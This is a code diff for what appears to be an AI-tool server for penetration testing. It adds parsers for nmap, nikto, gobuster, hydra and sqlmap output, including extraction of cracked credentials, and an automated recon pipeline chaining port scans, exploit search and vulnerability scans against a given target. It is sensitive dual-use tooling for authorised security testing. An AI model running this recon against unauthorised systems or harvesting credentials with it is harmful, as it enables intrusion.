+            port_match = re.match(r'(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)', line)
+            if port_match:
+                portid, proto, svc, extra = port_match.groups()
+                findings["open_ports"].append(f"{portid}/{proto}")
+                findings["services"].append(f"{portid}/{proto}: {svc} {extra}".strip())
+
+            # OS detection
+            os_match = re.search(r'OS details:\s*(.+)', line)
+            if os_match:
+                findings["os_detection"].append(os_match.group(1))
+
+            # Script output
+            script_match = re.match(r'\|_?\s*(.+)', line)
+            if script_match and findings["open_ports"]:
+                findings["scripts"].append(script_match.group(1)[:100])
+
+    # Build summary
+    output = f"Parsed nmap output from {filepath}\n{'=' * 40}\n\n"
+    output += f"Hosts: {', '.join(findings['hosts']) if findings['hosts'] else 'None found'}\n"
+    output += f"Open ports ({len(findings['open_ports'])}): {', '.join(findings['open_ports']) if findings['open_ports'] else 'None'}\n\n"
+
+    if findings["services"]:
+        output += "Services:\n"
+        for svc in findings["services"]:
+            output += f"  - {svc}\n"
+
+    if findings["os_detection"]:
+        output += f"\nOS Detection: {', '.join(findings['os_detection'])}\n"
+
+    if findings["scripts"]:
+        output += f"\nScript output ({len(findings['scripts'])} entries):\n"
+        for s in findings["scripts"][:20]:
+            output += f"  - {s}\n"
+
+    # Save parsed JSON
+    json_file = filepath.rsplit(".", 1)[0] + "_parsed.json"
+    try:
+        with open(json_file, "w") as f:
+            json.dump(findings, f, indent=2)
+        output += f"\nStructured data saved to: {json_file}"
+    except Exception:
+        pass
+
+    return [types.TextContent(type="text", text=output)]
+
+
+TOOL_OUTPUT_PATTERNS = {
+    "nikto": {
+        "detect": ["nikto", "Target IP:", "Target Hostname:"],
+        "finding_re": r'^\+\s+(.+)',
+    },
+    "gobuster": {
+        "detect": ["Gobuster", "==============="],
+        "finding_re": r'^(/\S+)\s+\(Status:\s*(\d+)\)',
+    },
+    "dirb": {
+        "detect": ["DIRB", "START_TIME:", "WORDLIST_FILES:"],
+        "finding_re": r'^\+\s+(http\S+)\s+\(CODE:(\d+)',
+    },
+    "hydra": {
+        "detect": ["Hydra", "[DATA]", "host:"],
+        "finding_re": r'\[(\d+)\]\[(\S+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S+)',
+    },
+    "sqlmap": {
+        "detect": ["sqlmap", "[INFO]", "Parameter:"],
+        "finding_re": r'\[INFO\]\s+(.+)',
+    },
+}
+
+
+async def parse_tool_output(
+    filepath: str,
+    tool_type: str = "auto",
+) -> Sequence[types.TextContent]:
+    """
+    Generic output parser for nikto/gobuster/dirb/hydra/sqlmap.
+
+    Args:
+        filepath: Path to tool output file
+        tool_type: Tool type (auto, nikto, gobuster, dirb, hydra, sqlmap)
+
+    Returns:
+        List containing TextContent with parsed findings
+    """
+    if not os.path.exists(filepath):
+        return [types.TextContent(type="text", text=f"Error: File not found: {filepath}")]
+
+    try:
+        with open(filepath, "r") as f:
+            content = f.read()
+    except Exception as e:
+        return [types.TextContent(type="text", text=f"Error reading file: {str(e)}")]
+
+    # Auto-detect tool
+    detected_tool = tool_type
+    if tool_type == "auto":
+        for tool_name, patterns in TOOL_OUTPUT_PATTERNS.items():
+            if any(d in content for d in patterns["detect"]):
+                detected_tool = tool_name
+                break
+        if detected_tool == "auto":
+            return [types.TextContent(type="text", text=
+                f"Could not auto-detect tool type from {filepath}. "
+                f"Specify tool_type: nikto, gobuster, dirb, hydra, sqlmap"
+            )]
+
+    if detected_tool not in TOOL_OUTPUT_PATTERNS:
+        return [types.TextContent(type="text", text=f"Unsupported tool_type: {detected_tool}")]
+
+    pattern_info = TOOL_OUTPUT_PATTERNS[detected_tool]
+    findings = re.findall(pattern_info["finding_re"], content, re.MULTILINE)
+
+    output = f"Parsed {detected_tool} output from {filepath}\n{'=' * 40}\n\n"
+    output += f"Total findings: {len(findings)}\n\n"
+
+    if detected_tool == "hydra":
+        output += "Credentials found:\n"
+        for match in findings:
+            if len(match) >= 5:
+                output += f"  - {match[3]}:{match[4]} @ {match[2]} ({match[1]} port {match[0]})\n"
+            else:
+                output += f"  - {match}\n"
+    elif detected_tool == "gobuster":
+        status_groups: dict = {}
+        for match in findings:
+            path, status = match if isinstance(match, tuple) else (match, "?")
+            status_groups.setdefault(status, []).append(path)
+        for status, paths in sorted(status_groups.items()):
+            output += f"Status {status} ({len(paths)} paths):\n"
+            for p in paths[:20]:
+                output += f"  - {p}\n"
+            if len(paths) > 20:
+                output += f"  ... and {len(paths) - 20} more\n"
+    else:
+        for match in findings[:50]:
+            entry = match if isinstance(match, str) else " | ".join(match)
+            output += f"  - {entry}\n"
+        if len(findings) > 50:
+            output += f"  ... and {len(findings) - 50} more\n"
+
+    # Save parsed output
+    json_file = filepath.rsplit(".", 1)[0] + "_parsed.json"
+    try:
+        with open(json_file, "w") as f:
+            json.dump({"tool": detected_tool, "filepath": filepath, "findings_count": len(findings), "findings": [m if isinstance(m, str) else list(m) for m in findings]}, f, indent=2)
+        output += f"\nStructured data saved to: {json_file}"
+    except Exception:
+        pass
+
+    return [types.TextContent(type="text", text=output)]
+
+
+# --- Phase 4: Workflow Automation ---
+
+
+async def recon_auto(
+    target: str,
+    depth: str = "quick",
+) -> Sequence[types.TextContent]:
+    """
+    Automated multi-stage reconnaissance pipeline.
+
+    Args:
+        target: Target domain or IP
+        depth: Recon depth (quick, standard, deep)
+
+    Returns:
+        List containing TextContent with reconnaissance results
+    """
+    results = []
+    phases_completed = []
+
+    async def run_phase(name: str, coro):
+        try:
+            result = await coro
+            phases_completed.append(name)
+            text = result[0].text if result else "No output"
+            results.append(f"--- {name} ---\n{text[:300]}\n")
+        except Exception as e:
+            results.append(f"--- {name} ---\nError: {str(e)}\n")
+
+    # Quick: dns_enum -> port_scan(quick) -> header_analysis
+    await run_phase("DNS Enumeration", dns_enum(target))
+    await run_phase("Quick Port Scan", port_scan(target, scan_type="quick"))
+    url_target = target if target.startswith(("http://", "https://")) else f"http://{target}"
+    await run_phase("Header Analysis", header_analysis(url_target))
+
+    if depth in ("standard", "deep"):
+        await run_phase("Service Scan", port_scan(target, scan_type="service"))
+        await run_phase("SSL Analysis", ssl_analysis(url_target))
+        await run_phase("Exploit Search", exploit_search(target))
+
+    if depth == "deep":
+        await run_phase("Subdomain Enumeration", subdomain_enum(target))
+        await run_phase("Web Enumeration", web_enumeration(url_target))
+        await run_phase("Vulnerability Scan", vulnerability_scan(target))
+
+    output = f"Automated Recon for {target} (depth: {depth})\n{'=' * 50}\n\n"
+    output += f"Phases completed: {len(phases_completed)}/{len(results)}\n"
+    output += f"Phases: {', '.join(phases_completed)}\n\n"
+    output += "\n".join(results)
+
+    # Save summary
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', target)
+    output_file = f"recon_{safe_target}_{depth}_{timestamp}.txt"
+    try:
+        with open(output_file, "w") as f:
+            f.write(output)
+    except Exception:
+        pass
+
+    output += f"\nFull report saved to: {output_file}"
+    return [types.TextContent(type="text", text=output)]
+
+
 OUTPUT_FILE_PATTERNS = [
     # Core tool outputs
     "command_output.txt",
@@ -1683,5 +2708,16 @@ OUTPUT_FILE_PATTERNS = [
     "*_subfinder",
     "*_amass",
     "*_wayback",
-    "*_gospider"
+    "*_gospider",
+
+    # New tool outputs
+    "hydra_*.txt",
+    "payload_*",
+    "port_scan_*.txt",
+    "port_scan_*.xml",
+    "dns_enum_*.txt",
+    "enum_shares_*.txt",
+    "*_parsed.json",
+    "recon_*.txt",
+    "credentials.json",
 ]
